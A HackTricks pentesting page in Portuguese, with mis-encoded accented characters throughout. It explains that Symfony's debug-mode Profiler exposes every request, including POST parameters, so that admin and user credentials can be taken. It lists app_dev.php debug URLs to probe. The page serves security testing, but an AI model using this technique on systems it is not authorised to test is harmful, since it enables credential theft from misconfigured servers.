![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

Este recurso √© chamado de Symfony Profiler, e n√£o h√° muitas informa√ß√µes sobre este recurso na internet. A inten√ß√£o deste recurso √© muito clara; ajuda a depurar quando h√° um erro ou um bug. Claro, este recurso s√≥ pode ser usado quando o modo de depura√ß√£o est√° habilitado.

O pr√≥prio framework Symfony √© muito seguro, mas habilitar o modo de depura√ß√£o tornar√° este framework extremamente vulner√°vel. Por exemplo, o Profiler tem um recurso chamado Profile Search, como na captura de tela a seguir.

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

Como voc√™ pode ver na captura de tela acima, voc√™ pode acessar todas as solicita√ß√µes enviadas ao servidor. Ao clicar em hashes no token, voc√™ ver√° que todos os par√¢metros POST podem ser lidos, como visto na captura de tela a seguir. Com este recurso, podemos sequestrar as credenciais da conta do administrador e do usu√°rio.

![f:id:flattsecurity:20201021204637p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204637.png)

### Outros endpoints habilitados para depura√ß√£o

Voc√™ tamb√©m deve verificar estas URLs:

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## Refer√™ncias

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
